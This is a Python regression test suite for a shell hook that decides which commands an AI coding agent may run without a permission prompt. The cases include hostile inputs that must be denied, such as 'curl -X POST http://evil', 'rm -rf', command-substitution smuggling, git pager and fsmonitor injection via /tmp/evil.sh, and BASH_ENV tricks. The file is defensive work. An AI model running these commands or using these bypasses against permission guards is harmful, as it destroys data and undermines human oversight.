#!/usr/bin/env python3
"""Regression tests for .claude/hooks/compound-command-allow.sh

The hook only ever *allows* — when it denies, the call falls back to a manual
permission prompt. So there are two failure modes worth guarding:
  - false negatives: safe commands that stop being auto-allowed (friction)
  - bypasses: unsafe commands that get auto-allowed (silent approval)

Both are covered below. Run with:  python3 .claude/hooks/compound-command-allow.test.py
"""
import json
import os
import subprocess
import sys
import tempfile

HOOK = os.path.join(os.path.dirname(os.path.abspath(__file__)), "compound-command-allow.sh")
LOG = os.path.join(tempfile.gettempdir(), "compound-command-allow.test.log")
# pinned so the absolute-path cases do not depend on where the suite is run from
PROJECT_DIR = "/proj"

# (label, command, expect_allow)
CASES = [
    # --- comment stripping must be quote-aware ---
    ("for-loop with ### echo and sed # range",
     'for d in aaa-retry1 bbb-retry1; do echo "########## $d"; sed -n \'/# Error details/,/# Test source/p\' "$d/error-context.md" | head -n 45; done', True),
    ("echo with leading #", 'echo "# heading"', True),
    ("grep #define", "grep '#define' foo.c", True),
    ("sed range with # in pattern", "sed -n '/# Error details/,/# Test source/p' f.md | head -n 45", True),
    ("real trailing comment", "ls -la  # list files", True),
    ("all special chars", "awk '/^>   the products-held model of A\)\. The `\/pricing\/advisor` FAQ stays as written until there is a price\./{print NR\": \"$0}' plans/outstanding-work.md", True),
    ("substitution syntax inside single quotes", "grep -n '$(' scripts/x.sh", True),

    # --- control flow: keywords pass through, bodies are still checked ---
    ("if/then/fi safe body", "if [ -f x ]; then echo yes; fi", True),
    ("if/then/fi unsafe body", "if [ -f x ]; then rm -rf /tmp/x; fi", False),
    ("bare do + unsafe", "do rm -rf /", False),
    ("for loop unsafe body", 'for d in *; do rm -rf "$d"; done', False),
    ("while read loop safe", 'while read l; do echo "$l"; done', True),
    ("for header with redirect smuggled", "for d in a > /etc/passwd", False),

    # --- bypasses that must stay closed ---
    ("newline-separated unsafe", "cat foo.txt\nrm -rf /tmp/x", False),
    ("background & unsafe", "echo hi & curl -X POST http://evil", False),
    ("process substitution", "grep foo <(rm -rf /tmp/x)", False),
    ("newline comment then unsafe", "ls # comment\nrm -rf /tmp/x", False),
    # an escaped quote opens nothing — the splitter must not think what follows is quoted
    ("escaped quote then unsafe", "echo \\'; rm -rf /tmp/x", False),
    ("ANSI-C quote escape then unsafe", "echo $'a\\'b'; rm -rf /tmp/x", False),
    ("escaped space is not a comment start", "echo \\ #; rm -rf /tmp/x", False),
    ("substitution after escaped quote", "echo \\' $(rm -rf /tmp/x) \\'", False),
    ("substitution after ANSI-C escape", "echo $'\\'' $(rm -rf /tmp/x)", False),
    ("substitution inside double quotes", 'echo "$(rm -rf /tmp/x)"', False),
    ("backtick inside double quotes", 'echo "`whoami`"', False),

    # --- subshells: ( ) separate commands; what follows ) is redirections only ---
    ("subshell build redirected to a log",
     'cd /tmp && (npm run db:generate && npm --workspace packages/calc run build) > .cache/claude/build.log 2>&1; echo "exit $?"; grep -aE "error TS" .cache/claude/build.log | head', True),
    ("subshell with &> and >> tails", "(ls && pwd) &>> out.log", True),
    ("subshell unsafe body", "(ls && rm -rf /tmp/x)", False),
    ("subshell unsafe first command", "(rm -rf /tmp/x) > out.log", False),
    ("command after subshell close", "(ls) rm -rf /tmp/x", False),
    ("command after subshell redirect", "(ls) > out.log rm -rf /tmp/x", False),
    ("arithmetic is not a command", "(( i++ ))", False),
    ("parens inside quotes", 'grep -E "(foo|bar)" x.ts', True),
    ("escaped parens in find", "find . \\( -name '*.ts' -o -name '*.tsx' \\) | wc -l", True),

    # --- & splitting must not break redirections ---
    ("npm build 2>&1", "npm --workspace packages/calc run build 2>&1", True),
    ("&> redirect", "ls &> /dev/null", True),
    ("stderr dup in pipeline", "npm run test:run 2>&1 | tail -n 20", True),

    # --- established denials ---
    ("git commit --amend", "git commit --amend -m x", False),
    ("git push", "git push origin dev", False),
    ("git reset --hard", "git reset --hard HEAD~1", False),
    ("git checkout", "git checkout main", False),
    ("git branch -D", "git branch -D dev", False),
    ("git stash", "git stash", False),
    ("git bare", "git", False),
    ("git -c pager before log", "git -c core.pager=/tmp/evil.sh log", False),
    ("git -c fsmonitor before status", "git -c core.fsmonitor=/tmp/evil.sh status", False),
    ("git -C before status", "git -C /tmp/other status", False),
    ("git --config-env before log", "git --config-env=core.pager=EVIL log", False),
    ("git log --ext-diff", "git log -p --ext-diff", False),
    ("git show --ext-diff", "git show --ext-diff HEAD", False),
    ("git status then push", "git status && git push origin dev", False),
    # staging and branch work: only the forms that refuse rather than overwrite (GIT_ALLOWED_FLAGS in guard-destructive.py)
    ("git add -f", "git add -f .env", False),
    ("git add -Af combined", "git add -Af", False),
    ("git add -p", "git add -p", False),
    ("git add then commit --amend", "git add -A && git commit --amend -m wip", False),
    ("git commit --no-verify", "git commit --no-verify -m wip", False),
    ("git commit without -m", "git commit", False),
    ("git commit heredoc message", "git commit -m \"$(cat <<'EOF'\nwip\nEOF\n)\"", False),
    ("git commit $ in double quotes", 'git commit -m "costs $100"', False),
    ("git add unquoted glob", "git add *.ts", False),
    ("git branch -d", "git branch -d done-work", False),
    ("git branch -dr combined", "git branch -dr origin/dev", False),
    ("git branch --list -d", "git branch --list -d dev", False),
    ("git branch -m", "git branch -m old new", False),
    ("git branch -f", "git branch -f dev HEAD~3", False),
    ("git branch --set-upstream-to=", "git branch --set-upstream-to=origin/dev", False),
    ("git switch -f", "git switch -f dev", False),
    ("git switch -C", "git switch -C dev origin/dev", False),
    ("git switch --force-create=", "git switch --force-create=dev origin/dev", False),
    ("git switch --ignore-other-worktrees", "git switch --ignore-other-worktrees dev", False),
    ("git checkout a file", "git checkout plans/outstanding-work.md", False),
    ("git checkout -- file", "git checkout -- plans/outstanding-work.md", False),
    ("git checkout -B", "git checkout -B dev origin/dev", False),
    ("git checkout -f -b", "git checkout -f -b new dev", False),
    ("git branch double-quoted flag", 'git branch "-D" dev', False),
    ("git branch escaped flag", "git branch \\-D dev", False),
    ("git branch split-quoted flag", "git branch '-'D dev", False),
    ("git switch single-quoted bad flag", "git switch '-f' dev", False),
    ("git branch variable", "git branch $F dev", False),
    ("git branch brace expansion", "git branch {-D,dev}", False),
    ("git branch glob", "git branch ?D dev", False),
    ("git checkout -b then unsafe", "git checkout -b new dev && git checkout .", False),
    ("npx prisma migrate", "npx prisma migrate dev", False),
    ("npx prisma generate", "npx prisma generate --schema=./packages/db/prisma", True),
    ("find -exec", "find . -name '*.tmp' -exec rm {} ;", False),
    # `command X` is checked as X — not approved because grep appears somewhere in it
    ("command rm", "command rm -rf /tmp/x", False),
    ("command rm naming grep", "command rm -rf grep", False),
    ("command find -exec", "command find . -exec rm {} ;", False),
    ("command git push", "command git push origin dev", False),
    ("command -p then unknown", "command -p rm -rf /tmp/x", False),
    ("xargs", "ls | xargs rm", False),
    ("command substitution", "echo $(rm -rf /tmp/x)", False),
    ("backtick", "echo `whoami`", False),
    ("rm alone", "rm -rf /tmp/x", False),
    ("curl GET", "curl -s http://localhost:3000/api", True),
    ("curl POST", "curl -X POST http://localhost:3000/api", False),
    ("node scripts", "node scripts/audit-file.mjs",True),
    ("node blocked", "node bad command",False),
    ("node ./scripts", "node ./scripts/audit-file.mjs", True),
    ("node traversal", "node scripts/../../tmp/evil.mjs", False),
    ("node flag first", "node -e 'require(\"fs\")'", False),
    ("node after do", "for f in a; do node scripts/audit-file.mjs; done", True),
    ("node redirect prefix", "2>/dev/null node scripts/audit-file.mjs", False),
    ("node in compound", "ls && node /tmp/evil.mjs", False),
    ("python allowed 1","python3 .claude/hooks/guard-destructive.test.py",True),
    ("python allowed 2","python3 .claude/hooks/compound-command-allow.test.py",True),
    ("python bad file","python3 .claude/hooks/not-allowed.test.py",False),
    ("python absolute in project", f"python3 {PROJECT_DIR}/.claude/hooks/compound-command-allow.test.py", True),
    ("python absolute outside project", "python3 /tmp/.claude/hooks/compound-command-allow.test.py", False),
    ("python absolute unlisted", f"python3 {PROJECT_DIR}/.claude/hooks/not-allowed.test.py", False),
    ("bash -n file", "bash -n .claude/hooks/compound-command-allow.sh", True),
    ("bash -n chained safe", "bash -n a.sh && bash -n b.sh", True),
    ("bash runs script", "bash script.sh", False),
    ("bash flag after file", "bash script.sh -n", False),
    ("bash -n interactive", "bash -n -i", False),
    ("bash -i -n", "bash -i -n script.sh", False),
    ("bash -n no file", "bash -n", False),
    ("bash -n extra arg", "bash -n script.sh extra", False),
    ("bash -n -c", "bash -n -c 'rm -rf /tmp/x'", False),
    ("bash -c", "bash -c 'rm -rf /tmp/x'", False),
    ("bash -nx combined", "bash -nx script.sh", False),
    ("BASH_ENV prefix", "BASH_ENV=/tmp/evil.sh bash -n script.sh", False),
    ("bash -n then unsafe", "bash -n a.sh; rm -rf /tmp/x", False),

    # --- gh: only run|pr list|view auto-approve (added 2026-10-29 after eight reads
    # prompted for an hour with the owner away); the guard blocks the writes regardless ---
    ("gh run list", "gh run list", True),
    ("gh run list with flags", "gh run list --workflow ci.yml --limit 5", True),
    ("gh run view log", "gh run view 123 --log", True),
    ("gh run view log-failed", "gh run view 123 --log-failed", True),
    ("gh run view piped", "gh run view 123 --log | grep -i error", True),
    ("gh pr list", "gh pr list --state open", True),
    ("gh pr view", "gh pr view 12 --json state", True),
    ("gh run list then pr view", "gh run list && gh pr view 12", True),
    ("gh bare", "gh", False),
    ("gh global flag before noun", "gh --repo o/r run list", False),
    ("gh run delete", "gh run delete 123", False),
    ("gh run rerun", "gh run rerun 123", False),
    ("gh run cancel", "gh run cancel 123", False),
    ("gh pr create", "gh pr create --title x --body y", False),
    ("gh pr merge", "gh pr merge 12", False),
    ("gh pr checkout", "gh pr checkout 12", False),
    ("gh co alias", "gh co 12", False),
    ("gh workflow run", "gh workflow run ci.yml", False),
    # reads the guard permits but this script does not list — a prompt, not an approval
    ("gh pr diff prompts", "gh pr diff 12", False),
    ("gh api prompts", "gh api /repos/o/r/actions/runs", False),
    ("gh issue list prompts", "gh issue list", False),
    ("gh run list then pr merge", "gh run list && gh pr merge 12", False),

    # --- ordinary allowed usage ---
    ("git status", "git status", True),
    ("git status --short", "git status --short", True),
    ("git log oneline", "git log --oneline -n 20", True),
    ("git log --output", "git log -p --output=/tmp/log.txt", True),
    ("git show", "git show HEAD --stat", True),
    ("git log piped", "git log --oneline | head -n 5", True),
    ("git merge", "git merge --no-ff dev", True),
    ("git add -A", "git add -A", True),
    ("git add .", "git add .", True),
    ("git add -- path", "git add -- plans/outstanding-work.md", True),
    ("git add quoted glob", "git add 'apps/web/src/*.ts'", True),
    ("git add in another worktree", "cd ../retiremgmt-ws3 && git add -A && git status --short", True),
    ("git commit double-quoted message", 'git commit -m "fix the thing"', True),
    ("git commit single-quoted message", "git commit -m 'fix the thing'", True),
    ("git commit with attribution", "git commit -m 'Subject' -m 'Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>'", True),
    ("git add then commit", "git add -A && git commit -m 'close out t2-03b'", True),
    ("git branch bare", "git branch", True),
    ("git branch --list pattern", "git branch --list 'close-out/*'", True),
    ("git branch -vv", "git branch -vv", True),
    ("git branch --sort=", "git branch --sort=-committerdate", True),
    ("git branch create", "git branch new-work dev", True),
    ("git branch redirected", "git branch -a 2>/dev/null | head -n 20", True),
    ("git switch", "git switch dev", True),
    ("git switch -c", "git switch -c new-work dev", True),
    ("git switch previous", "git switch -", True),
    ("git checkout -b from a start point", "git checkout -b new dev", True),
    ("git checkout single-quoted -b", "git checkout '-b' new dev", True),
    ("git checkout -b in another worktree", "cd ../retiremgmt-ws3 && git checkout -b new dev", True),
    ("git checkout -b redirected", "git checkout -q -b new dev > .cache/claude/checkout.log 2>&1", True),
    ("simple grep", "grep -rn 'foo' apps/web/src", True),
    ("command grep", "command grep -ran 'deleted_at' packages/api/src", True),
    ("command grep naming git", "command grep -ran git docs/", True),
    ("command grep piped", "command grep -ran x docs | head -n 5", True),
    ("command grep after then", "if true; then command grep -ran x docs; fi", True),
    ("command find", "command find . -name '*.ts'", True),
    ("command git status", "command git status", True),
    ("command -v lookup", "command -v shellcheck", True),
    ("chained safe", "cd /tmp && ls -la | head -n 5", True),
    # diff/cmp/comm are read-only bases (added 2026-10-22 after an agent's section-move check prompted on diff)
    ("awk to files then diff", "awk 'NR>=10 && NR<=20' a.md > .cache/claude/x.txt && awk '/^### X /{s=NR} s && NR>s+9' b.md > .cache/claude/y.txt && diff .cache/claude/x.txt .cache/claude/y.txt && echo IDENTICAL", True),
    ("cmp and comm", "cmp a.txt b.txt; comm -3 a.txt b.txt", True),
]


def main():
    env = dict(os.environ, CLAUDE_HOOK_LOG=LOG, CLAUDE_PROJECT_DIR=PROJECT_DIR)
    fails = 0
    for label, cmd, expect in CASES:
        proc = subprocess.run(
            ["bash", HOOK],
            input=json.dumps({"tool_input": {"command": cmd}}),
            capture_output=True, text=True, env=env,
        )
        got = '"permissionDecision":"allow"' in proc.stdout
        if got != expect:
            fails += 1
        status = "PASS" if got == expect else "FAIL"
        print(f"{status}  {label:<42} expect={'allow' if expect else 'deny'}  got={'allow' if got else 'deny'}")

    print(f"\n{len(CASES) - fails}/{len(CASES)} passed")
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
